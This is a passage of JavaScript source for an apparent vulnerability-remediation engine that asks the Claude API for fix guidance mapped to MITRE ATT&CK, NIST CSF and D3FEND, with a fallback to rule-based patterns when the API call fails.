Scanner Raw Finding: ${JSON.stringify(vuln.rawOutput || {})}

Provide comprehensive, actionable remediation guidance with real MITRE ATT&CK technique mappings, NIST CSF 2.0 categories, and MITRE D3FEND countermeasures.`;

    const message = await client.messages.create({
        model: 'claude-sonnet-4-5',
        max_tokens: 2000,
        messages: [{ role: 'user', content: userPrompt }],
        system: systemPrompt,
    });

    const content = message.content[0].text;
    // Extract JSON from response (handles any accidental markdown wrapping)
    const jsonMatch = content.match(/\{[\s\S]*\}/);
    if (!jsonMatch) throw new Error('Claude returned non-JSON response');
    return JSON.parse(jsonMatch[0]);
}

// ─────────────────────────────────────────────────────────────────────────────
// MAIN generateRemediation — Tries Claude, Falls Back to Rule-Based
// ─────────────────────────────────────────────────────────────────────────────
async function generateRemediation(vuln) {
    const priority = getPriorityMatrix(vuln.severity, vuln.cvssScore);
    const cvssInfo = getCvssSeverity(vuln.cvssScore || 5.0);

    // ─── Attempt Real Claude AI Remediation ───
    if (config.anthropic.apiKey) {
        try {
            logger.info(`[AI Engine] Generating Claude remediation for: ${vuln.title}`);
            const aiResult = await generateClaudeRemediation(vuln);

            return {
                meta: {
                    engineVersion: '3.0.0-claude',
                    generatedAt: new Date().toISOString(),
                    patternMatched: 'claude-ai',
                    confidence: 'Very High',
                    model: 'claude-sonnet-4-5',
                    aiPowered: true,
                },
                vulnerability: {
                    title: vuln.title,
                    severity: vuln.severity,
                    cvss: {
                        score: vuln.cvssScore || 5.0,
                        severity: cvssInfo.label,
                        color: cvssInfo.color,
                        vector: vuln.cvssVector || 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U',
                    },
                    classification: aiResult.classification || { cwe: 'N/A', owasp: 'See OWASP Top 10', category: vuln.category },
                    priority: aiResult.priority || priority,
                    complexity: aiResult.complexity || 'Medium',
                    estimatedEffort: aiResult.estimatedEffort || '4–8 hours',
                    mitreAttack: aiResult.mitreAttack || [],
                    nistCsf: aiResult.nistCsf || [],
                    d3fend: aiResult.d3fend || [],
                },
                remediation: {
                    summary: aiResult.summary,
                    immediateActions: aiResult.immediateActions,
                    codeExample: aiResult.codeExample,
                    hardeningSteps: aiResult.hardeningSteps,
                    references: aiResult.references,
                    complianceImpact: aiResult.complianceImpact || [],
                },
            };
        } catch (err) {
            logger.warn(`[AI Engine] Claude API failed (${err.message}), falling back to rule-based engine`);
        }
    }

    // ─── Fall Back to Rule-Based Engine ───
    logger.info(`[AI Engine] Using rule-based engine for: ${vuln.title}`);
    const pattern = matchPattern(vuln);
    const remediation = pattern ? pattern.remediation : DEFAULT_REMEDIATION;

    return {
        meta: {
            engineVersion: '2.5.0-rules',
            generatedAt: new Date().toISOString(),
            patternMatched: pattern?.id || 'generic',
            confidence: pattern ? 'High' : 'Low',
            aiPowered: false,
        },
        vulnerability: {
            title: vuln.title,
            severity: vuln.severity,
            cvss: {
                score: vuln.cvssScore || pattern?.cvss_base || 5.0,
                severity: cvssInfo.label,
                color: cvssInfo.color,
                vector: vuln.cvssVector || 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U',
            },
            classification: {
                cwe: pattern?.cwe || 'N/A',
                owasp: pattern?.owasp ? OWASP_MAP[pattern.owasp] : 'See OWASP Top 10',
                category: pattern?.category || vuln.category || 'Security Vulnerability',
            },
            priority,
            complexity: pattern?.complexity || 'Medium',
            estimatedEffort: pattern?.effort || '4–8 hours',
            mitreAttack: (pattern?.mitreAttack || []).map(id => ({
                id,
                name: MITRE_ATTACK.techniques[id]?.name || id,
                tactic: MITRE_ATTACK.tactics[MITRE_ATTACK.techniques[id]?.tactic] || 'Unknown',
                url: `https://attack.mitre.org/techniques/${id}/`,
            })),
            nistCsf: (pattern?.nistCsf || []).map(cat => ({
                function: cat.split('.')[0],
                category: cat,
                description: NIST_CSF[cat.split('.')[0]] || cat,
            })),
            d3fend: (pattern?.d3fend || []).map(id => ({
                id,
                name: D3FEND[id] || id,
                url: `https://d3fend.mitre.org/technique/d3f:${D3FEND[id]?.replace(/ /g, '')}/`,
            })),
        },
        remediation: {
            summary: remediation.summary,
            immediateActions: remediation.immediate,
            codeExample: remediation.codeExample,
            hardeningSteps: remediation.hardening,
            references: remediation.references,
            complianceImpact: remediation.compliance || [],
        },
    };
}

module.exports = { generateRemediation, matchPattern, VULN_PATTERNS, MITRE_ATTACK };
